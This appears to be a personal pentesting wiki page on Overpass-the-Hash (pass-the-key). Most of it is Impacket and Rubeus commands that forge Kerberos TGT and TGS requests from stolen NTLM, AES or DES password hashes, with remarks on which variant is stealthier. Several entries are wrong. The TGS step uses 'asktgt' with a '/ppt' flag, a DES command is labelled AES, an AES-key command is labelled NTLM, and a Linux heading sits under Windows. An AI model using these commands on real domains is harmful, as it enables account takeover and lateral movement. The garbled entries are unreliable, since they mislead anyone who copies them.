public:: true
alias:: pass-the-key

- This technique is also knows as *pass-the-key (PTK)*. It's similar to [[Pass-The-Ticket]], but it's meant to be use to request [[Kerberos]] tickets when you only know the hash of the user's password.
- Request a TGT ticket with the user's password hash
	- From Linux
		- With [[Impacket GetTGT]]
			- With user's NTLM hash
			  ```bash
			  impacket-getTGT <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
			  ```
			- With user's AES hash *(This is probably more stealth because it's used by default by Microsoft too)*
			  ```bash
			  impacket-getTGT <domain_name>/<user_name> -aesKey <aes_key>
			  ```
	- From Windows
		- With [[Rubeus]]
		  id:: 656874c1-93fc-4870-8b04-b6413ed64755
			- With user's NTLM hash
			  ```powershell
			  .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
			  ```
				- The `/ptt` flag applies the resulting ticket to the current logon session.
			- With user's AES128 hash
			  ```powershell
			  .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /aes128:<aes128_hash> /ptt
			  ```
			- With user's AES hash *(This is probably more stealth because it's used by default by Microsoft too)*
			  ```powershell
			  .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /aes256:<aes256_hash> /ptt
			  ```
			- With user's AES hash *(This is probably more stealth because it's used by default by Microsoft too)*
			  ```powershell
			  .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /des:<des_hash> /ptt
			  ```
- Request a TGS ticket with the user's password hash
	- From Linux
	- From Windows
		- With [[Rubeus]]
			- You first need to obtain a valid TGT, to get it via Overpass-The-Hash [see above](((656874c1-93fc-4870-8b04-b6413ed64755))).
			  ```powershell
			  Rubeus.exe asktgt /ticket:<base64_TGT> /service:<SPN_to_request_TGS_for> /ppt
			  ```
				- The `/ptt` flag applies the resulting ticket to the current logon session.
				- For all option see the official [docs](https://github.com/GhostPack/Rubeus#asktgs)
		- From Linux
			- With [[Impacket getST]]
				- With user's NTLM hash
				  ```bash
				  impacket-getST -SPN <SPN_to_request_TGS_for> -hashes <lm:nt> contoso.com/user
				  ```
				- With user's NTLM hash
				  ```bash
				  impacket-getST -SPN <SPN_to_request_TGS_for> -aesKey <hex_aes_key> contoso.com/user
				  ```